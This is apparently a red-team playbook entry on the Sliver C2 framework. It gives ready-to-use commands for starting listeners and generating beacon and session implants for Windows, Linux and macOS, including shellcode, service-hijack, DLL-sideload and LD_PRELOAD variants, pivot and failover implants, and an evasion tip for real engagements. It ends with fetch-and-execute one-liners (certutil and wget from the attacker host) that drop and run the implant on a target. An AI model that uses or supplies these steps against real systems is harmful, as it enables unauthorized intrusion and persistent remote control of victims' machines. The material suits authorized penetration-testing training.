title: Sliver — Generate Beacons & Implants
body:
Every Sliver implant has its transport, callback address, and port FROZEN at generation time. There is no runtime switch — if any of those are wrong, you regenerate. This node covers every OS/transport/format combination and the verification steps that catch a misconfigured implant before you waste time debugging a 'dead callback' that's really a port mismatch.

Beacon = periodic async check-in (stealthy, tasks queue). Session = persistent connection (real-time, noisier). Pick beacon unless you need interactive immediately — you can always upgrade later with 'interactive'.

⚠ DOUBLE-DASH every flag. -os is NOT --os. Single-dash -os is parsed as -o with value 's', giving compiler target s/amd64 which fails. This is the #1 Sliver generate error.
cmd:
# ══════════════════════════════════════════════════
# 0 — LISTENER MUST BE UP FIRST
# ══════════════════════════════════════════════════
mtls --lport 8888                    # preferred
https --lhost <LHOST> --lport 443    # egress-filtered networks
http --lhost <LHOST> --lport 80      # unencrypted fallback
jobs                                 # VERIFY — no job = nothing catching

# ══════════════════════════════════════════════════
# 1 — WINDOWS BEACONS
# ══════════════════════════════════════════════════
# mTLS (preferred):
generate beacon --mtls <LHOST>:8888 --os windows --arch amd64 \
  --format exe --seconds 5 --jitter 3 --name beacon.exe

# HTTPS:
generate beacon --https <LHOST>:443 --os windows --arch amd64 \
  --format exe --seconds 5 --jitter 3 --name beacon_https.exe

# HTTP:
generate beacon --http <LHOST>:80 --os windows --arch amd64 \
  --format exe --seconds 5 --jitter 3 --name beacon_http.exe

# Shellcode (for injection/loaders, not direct exec):
generate beacon --mtls <LHOST>:8888 --os windows --arch amd64 \
  --format shellcode --name beacon.bin

# Service binary (for service hijack privesc):
generate beacon --mtls <LHOST>:8888 --os windows --arch amd64 \
  --format service --name beacon_svc.exe

# Shared library (DLL — for DLL hijack / sideload):
generate beacon --mtls <LHOST>:8888 --os windows --arch amd64 \
  --format shared --name beacon.dll

# ══════════════════════════════════════════════════
# 2 — LINUX BEACONS (ELF)
# ══════════════════════════════════════════════════
# mTLS:
generate beacon --mtls <LHOST>:8888 --os linux --arch amd64 \
  --format elf --seconds 5 --jitter 3 --name beacon.elf

# HTTPS:
generate beacon --https <LHOST>:443 --os linux --arch amd64 \
  --format elf --seconds 5 --jitter 3 --name beacon_https.elf

# Shared object (.so — for LD_PRELOAD hijack):
generate beacon --mtls <LHOST>:8888 --os linux --arch amd64 \
  --format shared --name beacon.so

# ══════════════════════════════════════════════════
# 3 — macOS BEACONS
# ══════════════════════════════════════════════════
generate beacon --mtls <LHOST>:8888 --os darwin --arch amd64 \
  --format exe --seconds 5 --jitter 3 --name beacon_mac
# arm64 (M1/M2):
generate beacon --mtls <LHOST>:8888 --os darwin --arch arm64 \
  --format exe --seconds 5 --jitter 3 --name beacon_mac_arm

# ══════════════════════════════════════════════════
# 4 — SESSIONS (persistent, real-time — no 'beacon' keyword)
# ══════════════════════════════════════════════════
generate --mtls <LHOST>:8888 --os windows --arch amd64 \
  --format exe --name session.exe
generate --mtls <LHOST>:8888 --os linux --arch amd64 \
  --format elf --name session.elf

# ══════════════════════════════════════════════════
# 5 — FAILOVER (tries transports left to right)
# ══════════════════════════════════════════════════
generate beacon --mtls <LHOST>:8888 --https <LHOST>:443 \
  --os windows --format exe --seconds 5 --jitter 3 --name beacon_failover.exe
# Both listeners must be running. If mTLS dies, it falls to HTTPS.

# ══════════════════════════════════════════════════
# 6 — INTERNAL / PIVOT IMPLANTS
# ══════════════════════════════════════════════════
# When the target can't reach Kali directly — use the PIVOT host's IP:
generate beacon --mtls <PIVOT_INTERNAL_IP>:9001 --os windows \
  --format exe --name internal_beacon.exe
# See the c2_pivot_listener node for the full ligolo listener_add chain.

# tcp-pivot (no ligolo needed, rides through a Sliver session):
generate --tcp-pivot <PIVOT_INTERNAL_IP>:9898 --os windows \
  --format exe --name pivot_beacon.exe
# Requires a live SESSION on the pivot box running: pivots tcp --bind 0.0.0.0:9898

# ══════════════════════════════════════════════════
# 7 — VERIFY BEFORE DEPLOYING
# ══════════════════════════════════════════════════
implants                             # list everything you've built
# CHECK: does the baked-in host:port match your running listener?
jobs                                 # what's actually listening?
# implants shows callback → jobs shows listener → they MUST match.

# OPSEC check (skip if lab):
strings beacon.exe | grep -i sliver | head
# 'bishopfox/sliver' strings present = --skip-symbols was used.
# Rebuild WITHOUT --skip-symbols for real engagements.

# ══════════════════════════════════════════════════
# 8 — DEPLOY + CATCH
# ══════════════════════════════════════════════════
# Serve it:
python3 -m http.server 80
# Pull + run (Windows):
certutil -urlcache -f http://<LHOST>/beacon.exe C:\Windows\Temp\beacon.exe
C:\Windows\Temp\beacon.exe
# Pull + run (Linux):
wget http://<LHOST>/beacon.elf -O /tmp/beacon && chmod +x /tmp/beacon && /tmp/beacon

# Watch the console:
beacons                              # beacon check-in?
sessions                             # session callback?
warn: DOUBLE-DASH EVERY FLAG. -os windows is parsed as -o s, giving target s/amd64 which errors with 'invalid compiler target'. --os windows is correct. This bit you already — don't let it bite again. PORT MUST MATCH: generate --mtls HOST (no port) bakes in :8888 by default. If your listener is on a different port, the beacon calls 8888 and connects to nothing. Always pin the port explicitly. The transport is frozen — an HTTP implant cannot speak mTLS. Regenerate with the correct transport.

choices.label: Need to route through a pivot (internal box)
Transfer the implant to the target
